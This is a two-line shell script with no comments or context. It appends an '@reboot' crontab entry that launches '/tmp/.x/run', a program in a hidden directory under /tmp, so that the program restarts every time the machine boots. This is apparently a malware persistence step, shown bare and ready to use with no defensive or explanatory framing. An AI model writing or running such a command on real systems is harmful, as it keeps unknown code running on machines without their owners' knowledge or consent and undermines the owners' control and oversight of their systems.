#!/bin/sh
(crontab -l 2>/dev/null; echo "@reboot /tmp/.x/run") | crontab -
